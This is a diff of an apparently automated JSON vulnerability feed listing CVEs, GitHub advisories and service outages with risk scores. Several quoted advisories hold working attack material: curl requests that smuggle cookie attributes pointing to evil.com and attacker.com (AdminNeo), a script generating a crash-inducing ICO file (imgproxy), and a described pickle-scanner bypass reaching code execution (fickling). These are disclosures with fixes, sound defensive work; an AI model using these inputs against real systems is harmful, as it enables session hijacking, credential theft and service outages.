@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-10-30T18:53:00.917584+00:00",
+  "generated_at": "2026-10-30T22:58:56.692254+00:00",
   "items": [
     {
       "id": "CVE-2026-109618",
@@ -7,7 +7,7 @@
       "title": "PHP Memory Corruption Vulnerability",
       "description": "PHP uses longjmp() for out-of-memory (OOM) errors to exit the current context and abort handling of the request. Some contexts may not properly account for this scenario and leave request memory in an uninitialized state before performing an allocation. The subsequent request cleanup procedure may read or branch on this memory. Multiple OOM strategies can consistently trigger this condition and lead to remote code execution (RCE).",
       "published": "2026-10-21T14:17:09.357",
-      "updated": "2026-10-29T17:30:09.610",
+      "updated": "2026-10-30T19:18:07.373",
       "cvss": 9.2,
       "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "critical",
@@ -27,10 +27,11 @@
         "http://www.openwall.com/lists/oss-security/2026/10/21/6",
         "http://www.openwall.com/lists/oss-security/2026/10/23/5",
         "https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/",
+        "https://cert-portal.siemens.com/productcert/html/ssa-166980.html",
+        "https://cert-portal.siemens.com/productcert/html/ssa-566435.html",
         "https://cert-portal.siemens.com/productcert/html/ssa-566512.html",
         "https://php2shell.delftintellab.com",
         "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-109618",
-        "https://www.wiz.io/blog/php2shell-php-rce",
         "https://nvd.nist.gov/vuln/detail/CVE-2026-109618"
       ],
       "exploit_ref": false,
@@ -73,7 +74,7 @@
       "title": "PHP Stale Internal Request-State Vulnerability",
       "description": "PHP has various global state that temporarily points into request memory. In some scenarios, global state may not be correctly reset, or may be repopulated after being reset. The global state may then refer to request memory even after it has been freed. Subsequent requests may read or branch on this stale state before it is fully initialized. Multiple strategies can trigger this condition and produce remote code execution (RCE).",
       "published": "2026-10-21T14:17:09.823",
-      "updated": "2026-10-28T04:17:54.320",
+      "updated": "2026-10-30T19:18:07.753",
       "cvss": 9.2,
       "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "critical",
@@ -140,7 +141,7 @@
       "title": "Google Brotli Unchecked Return Value Vulnerability",
       "description": "A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.\n\n\n\n\n\nUsers need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.",
       "published": "2026-10-22T14:17:37.190",
-      "updated": "2026-10-30T11:17:32.020",
+      "updated": "2026-10-30T20:30:11.670",
       "cvss": 9.2,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "critical",
@@ -160,7 +161,16 @@
         "apache:arrow",
         "mcmilk:7-zip-zstd",
         "7-zip:p7zip",
-        "andybalholm:brotli"
+        "andybalholm:brotli",
+        "siemens:ruggedcom_ape1808_firmware",
+        "siemens:common_configurator",
+        "siemens:data_flow_monitoring",
+        "siemens:edge_opc_ua_server_configurator",
+        "siemens:flow_creator_configurator",
+        "siemens:industrial_edge_cloud_connector_configurator",
+        "siemens:industrial_edge_databus_configurator",
+        "siemens:industrial_edge_hub",
+        "siemens:industrial_edge_management_cloud"
       ],
       "packages": [],
       "vendor_products": [
@@ -185,7 +195,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.82641,
-      "epss_percentile": 0.99665,
+      "epss_percentile": 0.99666,
       "x_mentions": null,
       "sources": [
         "nvd",
@@ -332,46 +342,6 @@
         "npm:pxnpm"
       ],
       "match_type": "malware",
-      "tier": null,
-      "score": 90.0,
-      "level": "critical",
-      "score_breakdown": {},
-      "ai_analysis": ""
-    },
-    {
-      "id": "OUT-github-pwxsjgnvrk6b",
-      "aliases": [],
-      "title": "GitHub: Incident with Actions, Pages, and Webhooks",
-      "description": "GitHub の公式ステータスページに掲載された障害",
-      "published": "2026-10-30T17:50:54.677Z",
-      "updated": "2026-10-30T17:50:54.677Z",
-      "cvss": null,
-      "cvss_vector": "",
-      "severity": "",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://stspg.io/5cd2m4n59spv"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "status:github"
-      ],
-      "category": "outage",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T18:53:00.917584+00:00",
-      "matched": [
-        "github"
-      ],
-      "match_type": "status",
       "tier": null,
       "score": 90.0,
       "level": "critical",
@@ -1446,11 +1416,13 @@
       "title": "Ivanti Connect Secure Missing Authentication for Critical Function Vulnerability",
       "description": "Ivanti Connect Secure 22.8R2.4 mishandles the manner in which the dsinvoked broker trusts DSCache configuration data, leading to privilege escalation to root, as exploited in the wild in October 2026.",
       "published": "2026-10-15T21:17:13.190",
-      "updated": "2026-10-30T18:17:20.603",
+      "updated": "2026-10-30T20:29:25.850",
       "cvss": 7.0,
       "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
       "severity": "high",
-      "cpes": [],
+      "cpes": [
+        "ivanti:connect_secure"
+      ],
       "packages": [],
       "vendor_products": [
         "Ivanti Connect Secure"
@@ -2977,6 +2949,55 @@
       "category": "vuln",
       "resolved_at": "",
       "first_seen": "2026-10-29T15:34:30.523090+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-113264",
+      "aliases": [],
+      "title": "",
+      "description": "Improper input validation in Extensions in Google Chrome prior to 156.0.8078.47 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+      "published": "2026-10-20T22:19:20.110",
+      "updated": "2026-10-30T20:16:59.390",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/501786099"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00425,
+      "epss_percentile": 0.36825,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
       "matched": [
         "chrome"
       ],
@@ -35041,54 +35062,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-84243",
-      "aliases": [],
-      "title": "gettext: Directory traversal via the LANGUAGE environment variable",
-      "description": "The gettext family of functions in the GNU C Library version 2.0 and later accept LANGUAGE environment variable entries that contain '/' or that are equal to \"..\", unless the program is setuid or setgid (AT_SECURE).  An attacker who can set LANGUAGE in the environment of a program that uses gettext can make it load a message catalog (.mo file) from an arbitrary location in the file system.  A crafted .mo file can crash the program through out-of-range offsets, or supply translations whose format directives do not match the arguments passed by the program.  That causes undefined behaviour in the printf family of functions and may allow arbitrary code execution with the privileges of the program.  The safety of message catalogs relies on them being installed in trusted, read-only locations, and the directory traversal bypasses this.\n\nThe fix for CVE-2014-0475 rejects \"..\" path components in locale names passed to setlocale or taken from the LC_ALL, LC_* and LANG environment variables.  gettext reads LANGUAGE directly and appends each colon-separated entry to the message catalog directory, so that fix did not cover LANGUAGE.\n\nLANGUAGE is only used when the LC_MESSAGES locale is not \"C\", \"C.<encoding>\" or \"POSIX\", so the attacker must also be able to select another installed locale, for example through LANG or LC_ALL.  Exploitation also requires that the attacker can place the crafted file in a location readable by the target program, and that the environment crosses a trust boundary without the program running as AT_SECURE.  An example is an SSH server that accepts LANGUAGE and LANG from clients through the AcceptEnv directive and restricts an account to a forced command; the attacker may use this to escape the restriction.",
-      "published": "2026-10-30T17:43:35.178Z",
-      "updated": "2026-10-30T18:18:13.650",
-      "cvss": 7,
-      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "The GNU C Library glibc"
-      ],
-      "references": [
-        "https://sourceware.org/bugzilla/show_bug.cgi?id=17142",
-        "https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2026-0025",
-        "https://inbox.sourceware.org/libc-alpha/20261012112453.47383-1-avinal.xlvii@gmail.com"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T18:53:00.917584+00:00",
-      "matched": [
-        "glibc"
-      ],
-      "match_type": "exact",
-      "tier": 1,
-      "score": 44,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 30,
-        "cvss": 14
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-108358",
       "aliases": [
         "GHSA-3x94-m842-937c"
@@ -35894,6 +35867,57 @@
         "cvss": 8.6,
         "unauth_network": 5,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-118938",
+      "aliases": [],
+      "title": "Fickling check_safety() bypass: dotted __qualname__ in STACK_GLOBAL resolves a class-method attribute path that evades call analysis",
+      "description": "In Trail of Bits fickling through 0.1.12, a pickle STACK_GLOBAL operand carrying a dotted __qualname__ (for example \"Values.read_file\") is resolved by pickle's find_class through _getattribute to an arbitrary attribute path rather than to a module-level function. Fickling records only the leading component of the name in its import tracking and renders the operation as a plain import (for instance, 'python -m fickling' displays it as 'from optparse import Values.read_file'), so the trailing attribute reference is never analyzed as a call. The OvertlyBadEvals analysis pass does not flag it, and check_safety() returns LIKELY_SAFE with zero findings. This allows an attacker to reach a class method that performs code execution: optparse.Values.read_file executes exec(open(filename).read(), vars), achieving arbitrary code execution when the crafted pickle is loaded through fickling.load(), which chains check_safety() into pickle.loads() as an explicit security gate. optparse is present in all current CPython 3.x releases (deprecated as of Python 3.13, not removed). This weakness is in the resolution and analysis of dotted attribute-path names, and is distinct from and independently fixable from the module-origin trust weakness tracked as CVE-2026-16760: resolving or flagging dotted attribute-path imports closes this vector while leaving the module-level trust behavior unchanged. This bypass was verified to remain present on the vendor master branch at commit d011709 as of 2026-10-30, after the vendor's October blocklist additions and a new heuristic that flags private stdlib attributes; because the public class method Values.read_file is neither blocklisted nor flagged as a private attribute, it is not addressed by those remediations.",
+      "published": "2026-10-30T21:19:13.015Z",
+      "updated": "2026-10-30T22:16:54.020",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "trailofbits fickling",
+        "fickling"
+      ],
+      "references": [
+        "https://bombadil.systems/advisories.html",
+        "https://pypi.org/project/fickling/0.1.12/",
+        "https://github.com/trailofbits/fickling",
+        "https://github.com/trailofbits/fickling/commit/d011709"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "python"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 43.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 17.6,
+        "unauth_network": 5
       },
       "ai_analysis": ""
     },
@@ -37835,6 +37859,58 @@
       "first_seen": "2026-10-26T15:33:11.752934+00:00",
       "matched": [
         "openssl"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 42.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 16.4,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-96631",
+      "aliases": [
+        "GHSA-79wv-8rh2-9vp2"
+      ],
+      "title": "AdminNeo has Cookie Attribute Injection via Unsanitized X-Forwarded-Prefix in Set-Cookie Headers",
+      "description": "### Summary\n\nAdminNeo versions 4.6.0 through at least 5.5.0 are vulnerable to cookie attribute injection via the `X-Forwarded-Prefix` HTTP header. An attacker who can influence this header (e.g., through a reverse proxy that forwards it from clients, an attacker-controlled upstream proxy, or a man-in-the-middle position) can inject arbitrary cookie attributes including `Domain`, `Path`, `Secure`, and `SameSite` into all `Set-Cookie` response headers emitted by AdminNeo.\n\nThis allows an attacker to expand the cookie scope to an attacker-controlled domain (e.g., `Domain=.evil.com`), causing the victim's browser to send AdminNeo's `neo_sid` (session ID) and `neo_key` (database password encryption key) cookies to the attacker's server on subsequent requests.\n\nOriginally reported by @retkoussa in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-c533-9qwm-8w5h\n\n### Vulnerable Code\n\n**Root cause 1 - Unsanitized header prepended to `REQUEST_URI`**\n(`admin/include/bootstrap.inc.php`, lines 50–52):\n\n```php\nif ($_SERVER[\"HTTP_X_FORWARDED_PREFIX\"]) {\n\t$_SERVER[\"REQUEST_URI\"] = $_SERVER[\"HTTP_X_FORWARDED_PREFIX\"] . $_SERVER[\"REQUEST_URI\"];\n}\n```\n\nThe client-supplied `X-Forwarded-Prefix` header is concatenated into `REQUEST_URI` with no validation or sanitization of special characters (specifically semicolons, which delimit cookie attributes).\n\n**Root cause 2 - Manual `Set-Cookie `header construction without escaping**\n(`admin/include/functions.inc.php`, lines 416–424):\n\n```php\nfunction cookie(string $name, string $value, int $lifetime = 2592000): void\n{\n\theader(\"Set-Cookie: $name=\" . rawurlencode($value)\n\t\t. ($lifetime ? \"; expires=\" . gmdate(\"D, d M Y H:i:s\", time() + $lifetime) . \" GMT\" : \"\")\n\t\t. \"; path=\" . preg_replace('~\\?.*~', '', $_SERVER[\"REQUEST_URI\"])\n\t\t. (HTTPS ? \"; secure\" : \"\")\n\t\t. \"; HttpOnly; SameSite=lax\",\n\t\tfalse);\n}\n```\n\nThe tainted `REQUEST_URI` is interpolated directly into the `path=` attribute of the `Set-Cookie` header. Since semicolons are not stripped or escaped, any `;`-separated directives injected via `X-Forwarded-Prefix` become valid cookie attributes parsed by the browser.\n\n**Root cause 3 - Session cookie also tainted**\n(`admin/include/bootstrap.inc.php`, line 61):\n\n```php\nsession_set_cookie_params(0, preg_replace('~\\?.*~', '', $_SERVER[\"REQUEST_URI\"]), \"\", HTTPS, true);\n```\n\nThe PHP session cookie (`neo_sid`) path is similarly derived from the tainted `REQUEST_URI`, extending the same vulnerability to the session cookie set by PHP itself.\n\n### Impact\n\n- **Session hijacking:** The `neo_sid` session cookie is sent to the attacker's domain, allowing full session takeover.\n- **Credential theft:** The `neo_key` cookie contains the key used to encrypt/decrypt database passwords stored in the session. With this key, an attacker can decrypt saved database credentials.\n- **Session fixation:** An attacker can inject arbitrary `Path`, `SameSite`, and `Secure` attributes, manipulating cookie behavior.\n- **Wide applicability:** The `X-Forwarded-Prefix` header was specifically added to support reverse proxy deployments (Traefik `PathPrefixStrip`, nginx, HAProxy). These are the exact environments where this header is forwarded from clients, making the vulnerability relevant in the deployments it was designed for.\n\n### Affected Cookies\n\n|**Cookie**|**Content**|**Risk**|\n|`neo_sid`|PHP session ID|Session hijacking|\n|`neo_key`|Encryption key for stored DB passwords|Credential theft|\n|`neo_settings`|User preferences|Low (information disclosure)|\n\n### Proof of Concept\n\n```shell\n# Normal request with clean Set-Cookie headerss:\ncurl -sI http://localhost:8080/adminneo/index.php | grep -i set-cookie\n> Response: Set-Cookie: neo_key=...; path=/adminneo/index.php; HttpOnly; SameSite=lax\n\n# Malicious request — inject Domain=.evil.com:\ncurl -sI -H \"X-Forwarded-Prefix: /adminneo; Domain=.evil.com\" \\\n  http://localhost:8080/adminneo/index.php | grep -i set-cookie\n> Response: Set-Cookie: neo_key=...; path=/adminneo; Domain=.evil.com/adminneo/index.php; HttpOnly; SameSite=lax\n#                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ INJECTED\n\n# Full attribute override - inject Domain + SameSite=None:\ncurl -sI -H \"X-Forwarded-Prefix: /; Path=/; Domain=.attacker.com; SameSite=None\" \\\n  http://localhost:8080/adminneo/index.php | grep -i set-cookie\n> Response Set-Cookie: neo_key=...; path=/; Path=/; Domain=.attacker.com; SameSite=None/adminneo/index.php; ...\n```\n\n### Recommended Fix\n\n1. **Sanitize `X-Forwarded-Prefix`:** Strip or reject semicolons, newlines, and other HTTP header metacharacters from the `X-Forwarded-Prefix` value before using it.\n2. **Use `setcookie()` / `setrawcookie()`:** Replace the manual `header(\"Set-Cookie: ...\")` construction in `cookie()` with PHP's built-in `setcookie()` function, which properly escapes attribute values.\n3. **Validate `REQUEST_URI` before cookie use:** After any prefix manipulation, strip characters that are invalid in a cookie `path` attribute (`;`, `,`, whitespace per RFC 6265).\n\n```php\n// Example fix for bootstrap.inc.php:\nif ($_SERVER[\"HTTP_X_FORWARDED_PREFIX\"]) {\n    $prefix = preg_replace('~[;\\r\\n].*~', '', $_SERVER[\"HTTP_X_FORWARDED_PREFIX\"]);\n    $_SERVER[\"REQUEST_URI\"] = $prefix . $_SERVER[\"REQUEST_URI\"];\n}\n```\n\n### Server Based Workaround Via Config\n\nConfigure the reverse proxy to set `X-Forwarded-Prefix` to a static, trusted value rather than forwarding the client-supplied header:\n\n```nginx\n# nginx — secure configuration:\nfastcgi_param HTTP_X_FORWARDED_PREFIX /adminneo;  # static value, not $http_x_forwarded_prefix\n```\n\n```yaml\n# Traefik, use middleware instead of client headers:\nmiddlewares:\n  strip-prefix:\n    stripPrefix:\n      prefixes:\n        - \"/adminneo\"\n```",
+      "published": "2026-10-30T22:52:47Z",
+      "updated": "2026-10-30T22:52:48Z",
+      "cvss": 8.2,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "composer:adminneo-org/adminneo"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-79wv-8rh2-9vp2",
+        "https://github.com/adminneo-org/adminneo/security/advisories/GHSA-79wv-8rh2-9vp2",
+        "https://github.com/adminneo-org/adminneo/commit/aa6f2544a8a65cf5e8317f1a902f74181e136d64",
+        "https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1",
+        "https://github.com/advisories/GHSA-79wv-8rh2-9vp2"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "nginx"
       ],
       "match_type": "keyword",
       "tier": 1,
@@ -44263,6 +44339,57 @@
       "ai_analysis": ""
     },
     {
+      "id": "GHSA-494m-4556-wf5p",
+      "aliases": [],
+      "title": "imgproxy has out-of-bounds heap read/write in ICO loader BMP header reconstruction that allows unauthenticated remote worker crash",
+      "description": "### Summary\n\nOut-of-bounds heap write in imgproxy's ICO loader (`vips/icoload.c`): when the ICO entry's image data buffer is small, the loader's BMP-header-reconstruction writes land past the allocation, corrupting the size field of the following heap chunk. The worker then aborts deterministically (glibc `munmap_chunk(): invalid pointer` → SIGABRT → Go panic, exit code 2). \n\n### Details\n\nIn `vips_foreign_load_ico_header` in `vips/icoload.c`, after the ICO entry's image data is read into a heap buffer of `data_size + 14` bytes, the loader reconstructs a BMP file header in front of it using fields read from the ICO's internal BITMAPINFOHEADER:\n\n```\nuint32_t num_colors = GUINT32_FROM_LE(*(uint32_t *) (actual_data + 32));  // unvalidated\nuint16_t bpp        = GUINT16_FROM_LE(*(uint16_t *) (actual_data + 14));  // unvalidated\n```\n\n```\nif ((num_colors == 0) && (bpp <= 8))\n  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * (1 << bpp);\nelse\n  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * num_colors;\n```\n\n```\nint32_t height = GINT32_FROM_LE(*(int32_t *) (actual_data + 8));  // readable past the buffer\nheight = height / 2;\n```\n\nWith a crafted entry declaring a tiny `data_size` (e.g. 1 byte), all of these reads (offsets +8, +14, +32) go past the allocation, and the reconstructed-header writes land past the end of the buffer — specifically a 32-bit `height/2`-derived value at `alloc+22..+25`, overwriting the LSBs of the size field of the physically following heap chunk. The corrupted size is always `original_size >> 1` and, in cgo thread arenas, the `NON_MAIN_ARENA` bit lands in the `IS_MMAPPED` position of the corrupted word such that the next `free()` of the victim deterministically takes glibc's `munmap_chunk()` abort path, killing the worker. Depending on heap state, the worker returns 500 for the triggering request and aborts on the corrupted chunk's free; in observed production geometry it dies on the same request (exit code 2).\n\n\n### PoC\n\n```py\n# make_ico_oob.py — generates the exact 23-byte OOB-write trigger.\n# Byte-identical to the checksummed, production-verified file:\n#   ico-oob.ico  sha256 075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1\nimport struct, hashlib\n\nhdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1\n# 16x16, 0 colors, 0 reserved, 1 plane, 32 bpp, data_size=1, data_offset=0x16.\n# The tiny data_size (1) makes the loader's BMPINFOHEADER field reads\n# (data+8/+14/+32) and header-reconstruction writes go past the 1+14=15-byte\n# allocation.\nentry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 1, 0x16)\ndata = b'\\xAA'  # the single declared image byte\nblob = hdr + entry + data\nassert hashlib.sha256(blob).hexdigest() == \\\n    '075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1'\nopen('ico-oob.ico', 'wb').write(blob)\nprint(f\"ico-oob.ico: {len(blob)} bytes [VERIFIED]\")\n```\n\n```\n# imgproxy v4.0.15 with local file sources enabled:\n#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy\ncurl \"http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-oob.ico@png\"\n# → request fails at transport level (connection reset / empty reply) or\n#   HTTP 500; worker dies: munmap_chunk(): invalid pointer → SIGABRT →\n#   Go panic dump → exit code 2. One request, one dead worker.\n\ncurl \"http://127.0.0.1:8080/insecure/plain/local:///path/to/normal.ico@png\"\n# → HTTP 200, valid thumbnail (control)\n```\n\n### Impact\n\nOut-of-bounds write; demonstrated impact is denial of service (worker crash per crafted request). Any imgproxy deployment from the 3.3.x ICO-support series through v4.0.15 (latest at time of report) that processes attacker-supplied images.",
+      "published": "2026-10-30T22:56:14Z",
+      "updated": "2026-10-30T22:56:17Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "go:github.com/imgproxy/imgproxy/v3"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-494m-4556-wf5p",
+        "https://github.com/imgproxy/imgproxy/security/advisories/GHSA-494m-4556-wf5p",
+        "https://github.com/imgproxy/imgproxy/pull/1726",
+        "https://github.com/imgproxy/imgproxy/commit/39fd9e844a8a46084161502e993d5a3c16ccf28d",
+        "https://github.com/imgproxy/imgproxy/releases/tag/v4.0.17",
+        "https://github.com/advisories/GHSA-494m-4556-wf5p"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "glibc"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.0,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-99077",
       "aliases": [],
       "title": "",
@@ -45119,6 +45246,46 @@
         "cvss": 19.2,
         "epss": 0.0
       },
+      "ai_analysis": ""
+    },
+    {
+      "id": "OUT-github-pwxsjgnvrk6b",
+      "aliases": [],
+      "title": "GitHub: Incident with Actions, Pages, and Webhooks",
+      "description": "GitHub の公式ステータスページに掲載された障害",
+      "published": "2026-10-30T17:50:54.677Z",
+      "updated": "2026-10-30T19:23:40.177Z",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://stspg.io/5cd2m4n59spv"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:github"
+      ],
+      "category": "outage",
+      "resolved_at": "2026-10-30T19:23:40.177Z",
+      "first_seen": "2026-10-30T18:53:00.917584+00:00",
+      "matched": [
+        "github"
+      ],
+      "match_type": "status",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
       "ai_analysis": ""
     },
     {
@@ -47625,6 +47792,86 @@
       "ai_analysis": ""
     },
     {
+      "id": "OUT-github-lyyfm7j4pkgl",
+      "aliases": [],
+      "title": "GitHub: Incident with Dependabot",
+      "description": "GitHub の公式ステータスページに掲載された障害",
+      "published": "2026-10-30T20:59:14.225Z",
+      "updated": "2026-10-30T20:59:14.225Z",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://stspg.io/5bh6qnzn76tk"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:github"
+      ],
+      "category": "outage",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "github"
+      ],
+      "match_type": "status",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
+      "id": "OUT-openai-01M6754SR14HCQ3E9FX426E2N7",
+      "aliases": [],
+      "title": "OpenAI: Elevated errors with search in Dots, ChatGPT Work, and certain ChatGPT thinking experiences",
+      "description": "OpenAI の公式ステータスページに掲載された障害",
+      "published": "2026-10-30T19:38:47Z",
+      "updated": "2026-10-30T21:14:12Z",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://status.openai.com"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:openai"
+      ],
+      "category": "outage",
+      "resolved_at": "2026-10-30T21:14:12Z",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "openai"
+      ],
+      "match_type": "status",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-109829",
       "aliases": [
         "GHSA-4w7w-5xrc-9h26"
@@ -47922,6 +48169,58 @@
         "popularity": 21.0,
         "cvss": 18.6,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-96629",
+      "aliases": [
+        "GHSA-wm25-49w3-5qrg"
+      ],
